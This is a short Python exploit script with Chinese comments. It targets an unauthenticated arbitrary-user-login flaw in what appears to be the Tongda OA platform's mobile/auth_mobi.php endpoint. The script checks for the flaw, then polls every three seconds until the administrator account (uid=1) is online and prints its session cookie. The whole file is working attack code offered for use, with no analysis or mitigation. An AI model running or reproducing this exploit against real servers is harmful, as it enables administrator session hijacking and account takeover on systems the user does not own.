import requests
import time

def Valid_login(host): ## 有效的任意用户登录 需要管理员在线
    print('[->] 检测是否存在有效的任意登录漏洞')
    url = host + 'mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0'
    try:
        response = requests.get(url=url,timeout=2)
        # print(response.text)
        if 'RELOGIN' in response.text and response.status_code == 200:
            print('[*] 存在未授权任意用户登录漏洞\n')
            Valid_startlogin(url)
        else:
            print('[-] 不存在任意用户登录漏洞或者已经登录\n')
    except:
        pass

def Valid_startlogin(url): ## 监控uid=1登录用户
    print('[->] 3秒一次测试用户是否在线')
    try:
        while True:
            response = requests.get(url=url,timeout=2)
            if 'RELOGIN' in response.text and response.status_code == 200:
                print(' [-] 目标用户处于下线状态\n ' + time.asctime())
                time.sleep(3)
            else:
                cookie_key = response.cookies.keys()[0]  ## 拼接cookie
                cookie_value = response.cookies.values()[0]
                phpsession = cookie_key + '=' + cookie_value
                print('[*] 目标用户处于在线状态,cookie如下:\n' + time.asctime())
                print(phpsession)
                break
    except:
        pass

def run(host):
    time.sleep(0.5)
    Valid_login(host)